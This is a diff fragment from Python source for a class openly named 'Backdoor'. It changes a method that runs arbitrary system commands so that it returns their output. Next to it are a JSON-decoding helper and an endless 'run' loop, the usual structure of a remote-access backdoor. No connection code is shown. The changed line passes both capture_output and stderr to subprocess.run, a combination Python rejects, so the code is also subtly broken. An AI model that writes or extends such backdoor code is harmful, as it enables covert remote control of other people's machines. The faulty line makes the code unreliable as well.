@@ -16,7 +16,7 @@ class Backdoor:
         return json.loads(json_data)
 
     def execute_system_command(self, command):
-        return subprocess.run(command, capture_output=True)
+        return subprocess.run(command, capture_output=True, stderr=subprocess.STDOUT).stdout
 
     def run(self):
         while True:
